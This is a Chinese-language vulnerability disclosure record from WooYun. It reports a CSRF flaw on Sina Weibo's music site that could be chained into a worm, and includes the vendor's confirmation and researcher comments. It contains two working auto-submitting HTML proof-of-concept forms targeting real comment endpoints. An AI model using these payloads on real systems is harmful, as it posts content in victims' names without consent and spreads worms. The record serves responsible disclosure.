{"id": 12870, "wybug_id": "wooyun-2013-020816", "wybug_title": "sina微博某功能限制不严导致CSRF蠕虫", "wybug_corp": "新浪", "wybug_author": "se55i0n", "wybug_date": "2013-03-28 11:37", "wybug_open_date": "2013-05-12 11:38", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["应用配置错误", "利用技巧", "绕过", "类型应用", "漏洞利用", "敏感接口缺乏校验"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-04-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-04-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-04-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-05-12：\t细节向公众公开  简要描述： sina微博csrf蠕虫 详细说明：     问题站点在于新浪的微博音乐人,http://music.weibo.com/，站点有个对某个音乐人或作品进行评价回复同时可以同步到自己的sina微博的功能，此处未校验referer导致； \n\n一、第一处csrf1）对音乐人的某个作品进行评价并同步到sina微博；\n\n2）例子POC如下；\n<html><body><form id=\"se55i0n\" name=\"se55i0n\" action=\"http://music.weibo.com/snake/port/snk_song_comment.php\" method=\"POST\"><input type=\"text\" name=\"songid\" value=\"100027028\" /><input type=\"text\" name=\"text\" value=\"csrf is a bang!\" /><input type=\"text\" name=\"towb\" value=\"true\"><input type=\"submit\" value=\"submit\"></form><script>   document.se55i0n.submit();</script></body></html>\n3）执行效果见下图；\n\n4）返回微博音乐人查看效果；\n\n5）这里的回复的内容里过滤了http这个关键字，so，回复内容里无法带链接；\n\n二、第二处csrf1）在微博音乐人还有个功能就是，能对某个音乐人“说两句”并同步到自己的sina微博；\n\n2）这里可@任意人或多人一起@，内容能够自己定义且在回复内容中能够带上我们的http链接，这就为进一步的传播带来了基础，例子POC如下；\n<html><body><form id=\"se55i0n\" name=\"se55i0n\" action=\"http://music.weibo.com/snake/port/snk_artist_sendComment.php\" method=\"POST\"><input type=\"text\" name=\"weiboid\" value=\"3395246757380231\" /><input type=\"text\" name=\"text\" value=\"%40se55i0n%3A+go+go+go!http://www.baidu.com\" /><input type=\"text\" name=\"toweibo\" value=\"true\"><input type=\"submit\" value=\"submit\"></form><script>   document.se55i0n.submit();</script></body></html>\n3)运行POC效果；\n\n4）返回微博查看效果；\n\n   漏洞证明：  见详细说明   修复方案：  你们专业   版权声明：转载请注明来源 se55i0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-03-28 11:46 厂商回复： 感谢提供，已安排人员进行修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-03-28 11:42 |    \t\t带馅儿馒头 \t\t\t( 普通白帽子  |\t\t\t        Rank:1278 漏洞数:136        | 心在，梦在)\t\t \n  话说新浪加V要收米米？    \n     2013-03-28 12:57 |    \t\t苏南同学 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:5        | 苏南同学，就是苏南同学~~~)\t\t \n  又蠕动啦？    \n     2013-03-28 13:04 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:172        )\t\t \n  @苏南同学 小动了下，sina有给你送礼物么？    \n     2013-03-29 07:15 |    \t\t雅柏菲卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:1213 漏洞数:232        | 雙魚座聖鬥士雅柏菲卡)\t\t \n  应该吃些驱虫药 才能够驱虫啊    \n     2013-03-29 11:07 |    \t\t苏南同学 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:5        | 苏南同学，就是苏南同学~~~)\t\t \n  @se55i0n 没有，我啥都没有收到过 @新浪    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}